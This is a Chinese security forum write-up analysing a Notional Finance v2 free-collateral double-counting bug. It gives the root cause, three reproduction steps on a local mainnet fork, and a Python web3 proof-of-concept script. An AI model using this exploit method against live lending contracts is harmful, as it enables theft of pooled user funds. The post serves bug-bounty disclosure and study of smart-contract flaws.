#  Notional Double Counting Free Collateral 分析和复现   
ghostmazeW  看雪学苑   2023-01-05 18:03  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Is0VjqDecKs0O6OdYzwLsJeVn8oE39tzpdClg4s1kMesVicJVdN2KDNHA/640?wx_fmt=jpeg "")  
  
本文为看雪论坛优秀文章  
  
看雪论坛作者ID：ghostmazeW  
  
```
```  
  
  
Notional（  
https://notional.finance/portfolio/  
） 简单说来就是一个固定周期，固定利率的借贷池，主要支持Borrow,lend以及Provide Liquidity的功能。在notional v2中有一个free collateral的概念，根据你的free collateral的计算的值可以借贷出相应价值的代币，而这个漏洞就是在free collateral的计算上出现了问题，导致可以双重计数，从而能够以较低的抵押贷出比抵押价值要多的代币出来，利用该漏洞可以掏空整个LP中的所有资金。  
  
  
漏洞类型：逻辑  
  
  
难度：中等  
  
  
赏金：100万刀  
##   
##   
```
```  
  
  
  
1. 通过分析复现，发现本次漏洞的成因非常简单，就是在用户账户关键参数的读写上存在逻辑问题，导致能够双重计数。废话不多说，顺着调用链分析，首先是调用了enableBitmapCurrency() 来将用户的accountContext.bitmapCurrencyId = currencyId;设置为currencyId。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsXpapNMe3KdDM7oK7xT7ibkjQAiaygxpBUCk9zv4ALaTVtzRZl7Imlribg/640?wx_fmt=png "")  
  
先看看调用前getAccount()的值：（getAccount()返回的是一个数据结构体，可以跟进分析数据结构）  
  
  
[(0, b'\x00', 0, 0, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]  
  
  
接下来调用enableBitmapCurrency(1)，将currencyId =1 的代币设置为bitmapCurrencyId后：  
  
  
[(1641427200, b'\x00', 0, 1, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(1, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]  
  
  
此处可以看到，accountContext.bitmapCurrencyId 已经被设置成了1，且再次调用getAccount()，可以通过代码知道accountBalances[0]的值已经被赋值，因为此处我们只enable了bitmap，没有deposit任何代币，所以此处accountBalances[0]为(1, 0, 0, 0, 0)是没有任何问题的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Ism5GcnjTu7IFlULQ8Q6InHibTTzoateCFSSMgicUE37mDSjm4Nh5ZSGWw/640?wx_fmt=png "")  
  
  
2.此时在进行第二步操作，利用depositUnderlyingToken()向我们个人地址中deposit代币，此处用DAI作为例子，DAI的currencyId为2，这个可以直接通过代理合约调用接口查看。  
  
  
[(1641427200, b'\x00', 0, 1, b'@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(1, 0, 0, 0, 0), (2, 18344299339310, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]  
  
  
在充值完成后，查看账户信息，发现  
  
accountContext.activeCurrencies被赋值b'400200000000000000000000000000000000'  
  
  
accountBalances[1]被赋值为了(2, 18344299339310, 0, 0, 0)  
  
  
accountContext.activeCurrencies变量的修改，来自于depositUnderlyingToken中的 balanceState.finalize(account, accountContext, false);可以跟进看看。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IscTZO9BXL62Pwr6fTMknojia59M86f7mNby95BsC8wlYO7fHVttcaB4A/640?wx_fmt=png "")  
  
在.finalize(account, accountContext, false);中accountContext.setActiveCurrency会将 accountContext.activeCurrencies修改。但这不是重点。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Isrec628jgSXhZMRbHAVLqJ4mCOMDqiaylwMg255hdqGqRT7uy9LslwBw/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsIbkMKVPozw6hZ88M5fsu7RIgH5CKp4mAt0JzdltrtQZ9uLFpkvZbBg/640?wx_fmt=png "")  
  
此处查看getAccount()方法，如果accountContext.activeCurrencies存在的话，会去从存储中读取该代币的值，accountBalances = new AccountBalance[](10); accountBalances是一个长度为10数组，如果开始不是很清楚的话为啥是10的话，这个地方就能非常明白，在开启bitmapcurrency第一个数组是用来放账户中ETH的balance数据的，后面的9个数组是用来放其中支持的9种代币的balance数据的，bytes18即每2个字节代表一个代币。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsrjGB9IAf0Ze5FWcXchslHyqUhz70oApmsLAyNvmKdQcEV17tCicdTAA/640?wx_fmt=png "")  
  
到此，程序都是正常运行的，我们enable了currencyId == 1 的ETH，但是没有充值，所以ETH的balance数据为(1, 0, 0, 0, 0)，第二步我们充值了DAI，所以DAI的balance为(2, 18344299339310, 0, 0, 0)，这些都没有问题。  
  
  
3.接下来进行第三步，再次enableBitmapCurrency()，此时将DAI的currencyId 作为参数。执行完成后，查看Account。此时发现accountBalances的前两个数组的值变成一样了，也就是说ETH所在的balance被DAI的balance覆盖了。  
  
  
[(1641427200, b'\x00', 0, 2, b'@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(2, 18344299339310, 0, 0, 0), (2, 18344299339310, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]  
  
  
同时查看：free_collateral: [212752332, [18344299339310, 18344299339310, 0, 0, 0, 0, 0, 0, 0, 0]],发现价值翻倍了。  
  
  
再来看看getAccount()中设置ETH balance的代码，如果accountContext.isBitmapEnabled()，则会以bitmapCurrencyId所代表的代币balance来赋值到accountBalances[0]。OK，问题就在这里，也就是说通过修改bitmapCurrencyId的值能覆盖ETH所代表的balance位的值，实现double couting。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsBDfibhT6ia0LqbocySxrZkduuNqev9qDne28D7RUZPp6v0UiaVfOlpx7A/640?wx_fmt=png "")  
##   
##   
```
```  
  
  
对于漏洞的复现，其实步骤很简单。源码：https://github.com/notional-finance/contracts-v2  
  
  
npx hardhat node --fork https://eth-mainnet.alchemyapi.io/v2/your_key --fork-block-number 13950000  
  
  
（1）enableBitmapCurrency(1) //启用bitmap,将ETH设置为bitmapCurrency。  
  
  
（2）depositUnderlyingToken(useraddr,2,amount) //充值DAI  
  
此处如果没有DAI，需要先到swap购买DAI，然后approve notional的代理合约地址。  
  
  
（3）enableBitmapCurrency(2) //启用bitmap,将DAI设置为bitmapCurrency。  
  
  
此3步就能完全复现漏洞。  
  
  
具体的POC，我是直接用python web3调用的，也可以自己构造或者用contract实现。  
  
  
这是我临时用的py 测试脚本，可以参考。  
```
from web3 import Web3
from Constant import Abi
import binascii
 
class Poc:
    def __init__(self):
        self.web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))
        #self.web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/yourkey"))
        self.NationalAbi = Abi.NationalAbi
        #self.addr = '0xdE14D5F07456c86F070C108A04Ae2fafdbD2A939'
        self.addr = "0x1344A36A1B56144C3Bc62E7757377D288fDE0369"
        self.uni_router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"
        self.cdai_address = "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643"
        self.dai_address = "0x6B175474E89094C44Da98b954EedeAC495271d0F"
        self.uniswap_router_abi = Abi.UniswapRouter2
        self.cdai_abi = Abi.CDaiAbi
        self.dai_abi = Abi.DaiAbi
        self.contract = self.web3.eth.contract(address=self.addr, abi=self.NationalAbi)
        self.uniswapRouter =self.web3.eth.contract(address=self.uni_router,abi=self.uniswap_router_abi)
        self.cdai_token = self.web3.eth.contract(address=self.cdai_address,abi=self.cdai_abi)
        self.dai_token = self.web3.eth.contract(address=self.dai_address,abi=self.dai_abi)
        self.privatekey = "your privatekey"
        self.account = self.web3.eth.account.from_key(self.privatekey)
        self.txParams = {
            'chainId': 31337, #hardhat chianid
            'nonce': self.web3.eth.getTransactionCount(self.account.address),
            'gas': 2000000,
            'from': self.account.address,
            # 'value': Web3.toWei(0, 'ether'),
            'gasPrice': self.web3.eth.gasPrice,
        }
 
    def get_free_collateral(self, address):
        '''
           获取
        :param address:
        :return:
        '''
        result = self.contract.functions.getFreeCollateral(address).call()
        print(result)
 
    def enable_bitmapCurrency(self, currencyid):
        '''
        开启bitmapCurrency
        :return:
        '''
        tx = self.contract.functions.enableBitmapCurrency(currencyid).buildTransaction(self.txParams)
        signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey)  # 账号交易签名
        res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex()  # 发送原始签名
        print(res)
        txn_receipt = self.web3.eth.wait_for_transaction_receipt(res)  # 接受交易结果，并返回交易结果
        print(txn_receipt)
        return txn_receipt
        # signed = self.account.signTransaction(tx)  # 用账户对交易签名
        # tx_id = self.web3.eth.sendRawTransaction(signed.rawTransaction)  # 交易发送并获取交易id
        # tx_hash = self.contract.functions.enableBitmapCurrency(currencyid).transact()
        # result = self.web3.eth.wait_for_transaction_receipt(tx_hash)
        # print(result)
 
    def swap_eth_for_exact_tokens(self,amountout,ethnum,path,to,deadline):
        '''
        兑换Token
        :return:
        '''
        self.txParams.update({"value":Web3.toWei(ethnum, "ether")})
        tx = self.uniswapRouter.functions.swapETHForExactTokens(amountout, path, to, deadline).buildTransaction(self.txParams)
        result = self.sign_and_sendtx(tx)
        print(result)
 
 
        # signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey)  # 账号交易签名
        # res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex()  # 发送原始签名
        # print(res)
        # txn_receipt = self.web3.eth.wait_for_transaction_receipt(res)  # 接受交易结果，并返回交易结果
        # print(txn_receipt)
 
    def sign_and_sendtx(self,tx):
        '''
        验签和的发送交易
        :param tx:
        :return:
        '''
        signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey)  # 账号交易签名
        res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex()  # 发送原始签名
        txn_receipt = self.web3.eth.wait_for_transaction_receipt(res)  # 接受交易结果，并返回交易结果
 
        return txn_receipt
 
 
 
    def get_all_functions(self,addr,abi):
        '''
        获取所有方法
        :return:
        '''
        funcs = self.web3.eth.contract(address=addr, abi=abi)
        for func in funcs.all_functions():
            print(func)
 
    def get_account_context(self, address):
        '''
        获取账户上下文
        :param address:
        :return:
        '''
        result = self.contract.functions.getAccountContext(address).call()
        print(result)
        print("nextSettleTime:"+str(result[0]))
        print("hasDebt:" + str(binascii.b2a_hex(result[1])))
        print("assetArrayLength:" + str(result[2]))
        print("bitmapCurrencyId:" + str(result[3]))
        print("activeCurrencies:" + str(binascii.b2a_hex(result[4])))
 
    def get_currencyid(self, address):
        result = self.contract.functions.getCurrencyId(address).call()
        print(result)
 
    def deposit_underlying_token(self,account,currencyId,amountExternalPrecision):
        '''
        充值
        :param account:
        :param currencyId:
        :param amountExternalPrecision:
        :return:
        '''
        self.txParams.update({"value": Web3.toWei(1, "ether")})
        tx = self.contract.functions.depositUnderlyingToken(account, currencyId, amountExternalPrecision).buildTransaction(
            self.txParams)
        result = self.sign_and_sendtx(tx)
        print(result)
 
    def allowance_dai(self):
        '''
 
        :param address:
        :return:
        '''
        result = self.cdai_token.functions.allowance(self.account.address,self.addr).call()
        print(result)
 
    def approve_cdai(self):
        '''
 
        :param address:
        :return:
        '''
        tx = self.cdai_token.functions.approve(self.addr, 0xffffffff).buildTransaction(
            self.txParams)
        result = self.sign_and_sendtx(tx)
        print(result)
 
    def approve_dai(self):
        # tx = self.dai_token.functions.approve(self.addr, 0xffffffff).buildTransaction(
        #     self.txParams)
        # result = self.sign_and_sendtx(tx)
        # print(result)
 
        tx = self.dai_token.functions.approve(self.addr, 1000000000000000000000000000).buildTransaction(
            self.txParams)
        result = self.sign_and_sendtx(tx)
        print(result)
 
    def get_account(self,address):
        '''
        获取账户信息
        :param address:
        :return:
        '''
        result = self.contract.functions.getAccount(Web3.toChecksumAddress(address)).call()
        print(result)
 
 
    def start(self):
        '''
        start test
        :return:
        '''
        cdai = "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643" #8
        ceth = "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5"
        # 兑换dai
        # amountout = 4000 * 10 ** 18
        # path = ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","0x6B175474E89094C44Da98b954EedeAC495271d0F"]
        # to = self.account.address
        # deadline = 0xffffffff
        # self.swap_eth_for_exact_tokens(amountout,2,path,to,deadline)
 
        #self.get_free_collateral(self.account.address)
        # 设置
        #self.enable_bitmapCurrency(1)
        # self.get_free_collateral(Web3.toChecksumAddress("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"))
        # self.get_account_context(Web3.toChecksumAddress("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"))
        # self.get_account("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266")
        #self.enable_bitmapCurrency(2)
        #self.get_currencyid(Web3.toChecksumAddress("0x5d3a536e4d6dbd6114cc1ead35777bab948e3643"))
        # self.get_currencyid(Web3.toChecksumAddress("0x6b175474e89094c44da98b954eedeac495271d0f"))
       # self.approve_dai()
        # self.approve_dai_cdai()
        #self.deposit_underlying_token(self.account.address,160,1000000000000000000)
 
 
 
 
if __name__ == "__main__":
    Poc().start()
```  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Is5dgLfWBqNyyxIiclS3licpYIMHuGlQ8dPKsVZKCEcEKXy7lt2sUVE9iaQ/640?wx_fmt=jpeg "")  
  
  
**看雪ID：ghostmazeW**  
  
https://bbs.pediy.com/user-home-811277.htm  
  
*本文由看雪论坛 ghostmazeW 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458489490&idx=4&sn=015d30b07249e2ae48a03a3303852771&chksm=b18ea21886f92b0eae761fea6f0448bc83f772e551fe6c9bf196828917a07dcaf432a306575a&scene=21#wechat_redirect)  
  
  
**#****往期推荐**  
  
1.[CVE-2022-21882提权漏洞学习笔记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471430&idx=1&sn=6a47d0c5c8f3f6204548e80977ecd059&chksm=b18e7c8c86f9f59a88d9b8e83c8297e0ef65034a73436998ab835531baadaa51f3d630793b95&scene=21#wechat_redirect)  
  
  
2.[wibu证书 - 初探](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471429&idx=1&sn=a85188de9b9697fd1b9e708bb8bb1fdb&chksm=b18e7c8f86f9f59933d6cbf0040ed796f06e37b23f17f1ae842eb22257de02338e1a8d751f6b&scene=21#wechat_redirect)  
  
  
3.[win10 1909逆向之APIC中断和实验](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471421&idx=2&sn=e83cf7220dc1c4c06a2efc78593e30cc&chksm=b18e7b7786f9f2614ecce34e23be7f71a3d3516766aabda8f25ae41c81ef359a2c245503cf86&scene=21#wechat_redirect)  
  
  
4.[EMET下EAF机制分析以及模拟实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468723&idx=2&sn=5a830d04185d80e1b6cfa639dc6c6c15&chksm=b18e71f986f9f8ef5b3c2fec51f69751e63a5d6bdbadf43b49728ba05606fc4ac63fda378c92&scene=21#wechat_redirect)  
  
  
5.[sql注入学习分享](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468108&idx=1&sn=42c8ec155e13e3882cf4aeb60cdbb982&chksm=b18e0f8686f98690c9792298abb04dd243862ff8effd545dc668c7b1c682aaacf9797d899e97&scene=21#wechat_redirect)  
  
  
6.[V8 Array.prototype.concat函数出现过的issues和他们的POC们](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468074&idx=2&sn=06eb27c1649bd4e3a3e43a46a9500add&chksm=b18e0e6086f9877644ba0de33658232f99213d1b1b074342260031cb529c1b7ad1b89b2e0204&scene=21#wechat_redirect)  
****  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif "")  
  
点击“阅读原文”，了解更多！  
  
